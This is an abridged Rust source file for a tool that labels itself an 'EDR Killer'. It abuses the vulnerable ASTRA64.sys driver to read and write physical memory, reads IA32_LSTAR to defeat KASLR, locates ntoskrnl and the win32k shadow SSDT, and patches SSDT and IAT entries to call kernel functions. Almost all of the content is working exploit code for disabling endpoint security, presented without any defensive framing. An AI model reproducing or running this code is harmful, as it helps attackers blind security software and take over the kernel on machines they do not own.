...
// ── ASTRA64.sys physical memory R/W ─────────────────────────────────────
...
impl Astra {
    ...
    fn map_phys(&self, phys: u64, size: u32) -> Option<usize> {
        ...
        let try_va = |hi: u64| -> Option<usize> {
            ...
            let n = unsafe {
                VirtualQuery(Some(cand as *const c_void), &mut mbi, mem::size_of::<MEMORY_BASIC_INFORMATION>())
            };
    ...
    fn safe_copy_from(src: *const u8, dst: *mut u8, len: usize) -> bool {
        ...
        unsafe {
            ReadProcessMemory(
                GetCurrentProcess(), src as *const c_void, dst as *mut c_void,
                len, Some(&mut read),
            ).is_ok() && read == len
        }
    }
    ...
    fn read_phys(&self, addr: u64, buf: &mut [u8]) -> bool {
        ...
        while pos < buf.len() {
            ...
            let va = match self.map_phys(page, 0x1000) { Some(v) => v, None => return false };
    ...
    fn write_phys(&self, addr: u64, buf: &[u8]) -> bool {
        ...
        while pos < buf.len() {
            ...
            let chunk = (buf.len() - pos).min(0x1000 - off);
            let va = match self.map_phys(page, 0x1000) { Some(v) => v, None => return false };
            unsafe { ptr::copy_nonoverlapping(buf[pos..].as_ptr(), (va + off) as *mut u8, chunk); }
            self.unmap(va);
            pos += chunk;
            cur += chunk as u64;
        }
    ...
    fn read_phys_u32(&self, addr: u64) -> Option<u32> {
        let mut b = [0u8; 4];
        if self.read_phys(addr, &mut b) { Some(u32::from_le_bytes(b)) } else { None }
    }
...
fn vread(drv: &Astra, cr3: u64, va: u64, buf: &mut [u8]) -> bool {
    match virt_to_phys(drv, cr3, va) { Some(pa) => drv.read_phys(pa, buf), None => false }
}
...
fn vwrite_u32(drv: &Astra, cr3: u64, va: u64, val: u32) -> bool {
    match virt_to_phys(drv, cr3, va) { Some(pa) => drv.write_phys(pa, &val.to_le_bytes()), None => false }
}
...
// ── ntoskrnl base via MZ walk-back from LSTAR ───────────────────────────
...
fn find_ntoskrnl_base(drv: &Astra, cr3: u64, lstar: u64) -> Result<u64, String> {
    ...
    for i in 0..0x4000u64 {
        ...
        if !drv.read_phys(pa, &mut hdr) { continue; }
...
fn kernel_export_va(drv: &Astra, cr3: u64, base: u64, target: &str) -> Option<u64> {
    ...
    if !vread(drv, cr3, base, &mut hdr) { return None; }
    let lfn = u32::from_le_bytes(hdr[0x3C..0x40].try_into().unwrap()) as usize;
    ...
    let mut exp = [0u8; 40];
    if !vread(drv, cr3, base + exp_rva, &mut exp) { return None; }
...
fn disk_export_rva(base: usize, name: &str) -> Option<u64> {
    ...
    let p = unsafe { GetProcAddress(HMODULE(base as *mut _), PCSTR(f.as_ptr() as _)) }?;
...
fn get_syscall_index(w32u: usize, name: &str) -> Result<u32, String> {
    ...
    if eax >> 12 != 1 { return Err(format!("{name}: wrong table")); }
    Ok(eax & 0xFFF)
}
...
// ── Shadow SSDT discovery ───────────────────────────────────────────────

struct SsdtInfo { w32k_base: u64, w32k_limit: u32 }
...
fn find_shadow_ssdt(drv: &Astra, cr3: u64, nt_base: u64) -> Result<SsdtInfo, String> {
    ...
    if !vread(drv, cr3, add_va, &mut scan) { return Err("read KeAddSystemServiceTable fail".into()); }
    ...
    while i + 8 <= scan.len() {
        ...
        if b[0] == 0x48 && (b[1] == 0x8D || b[1] == 0x8B || b[1] == 0x89) && b[2] & 0xC7 == 0x05 {
            ...
            for sub in 0..=0x20u64 { if t >= sub { cands.push(t - sub); } }
            i += 7; continue;
        }
    ...
    for rva in cands {
        let kd = nt_base + rva;
        let nt_st = match vread_u64(drv, cr3, kd) { Some(v) => v, None => continue };
        if !is_kptr(nt_st) || nt_st < nt_base || nt_st > nt_base + 0x200_0000 { continue; }
        let nt_lim = vread_u32(drv, cr3, kd + 0x10).unwrap_or(0);
        if !(0x100..=0x400).contains(&nt_lim) { continue; }
        let w_st = match vread_u64(drv, cr3, kd + 0x20) { Some(v) => v, None => continue };
        if !is_kptr(w_st) { continue; }
        let w_lim = vread_u32(drv, cr3, kd + 0x30).unwrap_or(0);
        if !(0x400..=0x2000).contains(&w_lim) { continue; }
        return Ok(SsdtInfo { w32k_base: w_st, w32k_limit: w_lim });
    }
...
fn find_gadget_disk(base: usize, size: usize, kva: u64, ssdt_base: u64) -> Result<(u64, u64), String> {
    const LIM: i64 = 1 << 27;
    ...
    best.map(|(g, iat, _)| (g, iat)).ok_or("no FF 25 thunk".into())
}

fn encode_entry(target: u64, base: u64, orig: u32) -> Result<u32, String> {
    let off: i64 = target as i64 - base as i64;
    if off >= (1 << 27) || off < -(1 << 27) { return Err("offset overflow".into()); }
...
fn main() {
    ...
    log("\n  ASTRA64.sys EDR Killer — Data-Only Shadow SSDT Hijack\n");

    // 1. Open driver
    let drv = match Astra::open() {
        Ok(d) => { log("[+] ASTRA64.sys opened"); d }
        Err(e) => { log(&format!("[-] {e}")); std::process::exit(1); }
    };

    // 2. KASLR bypass via IA32_LSTAR
    let lstar = match drv.read_msr(IA32_LSTAR) {
        Ok(v) if is_kptr(v) => { log(&format!("[+] IA32_LSTAR = 0x{v:X}")); v }
        Ok(v) => { log(&format!("[-] bad LSTAR 0x{v:X}")); std::process::exit(1); }
        Err(e) => { log(&format!("[-] {e}")); std::process::exit(1); }
    };
    ...
    // 5. Resolve kernel functions
    let pool_alloc = kernel_export_va(&drv, cr3, nt, "ExAllocatePoolWithTag").expect("ExAllocatePoolWithTag");
    let ps_lookup = kernel_export_va(&drv, cr3, nt, "PsLookupProcessByProcessId").expect("PsLookupProcessByProcessId");
    let obf_deref = kernel_export_va(&drv, cr3, nt, "ObfDereferenceObject").expect("ObfDereferenceObject");
    ...
    let w32k_base = {
        ...
        for i in 0..0x4000u64 {
            ...
            if !is_kptr(va) { break; }
            let mut h = [0u8; 2];
            if vread(&drv, cr3, va, &mut h) && h == *b"MZ" { found = Some(va); break; }
        }
    ...
    for name in &["win32kbase.sys", "win32kfull.sys", "win32k.sys"] {
        if let Ok((b, sz)) = load_disk_image(name) {
            if sz == mem_size { disk = b; dsz = sz;
                log(&format!("[+] Matched {name} (0x{mem_size:X})")); break; }
        }
    }
    if disk == 0 { log("[-] No win32k match"); std::process::exit(1); }
    ...
    // 7. Patch SSDT + IAT → ExAllocatePoolWithTag, alloc pool for EPROCESS output
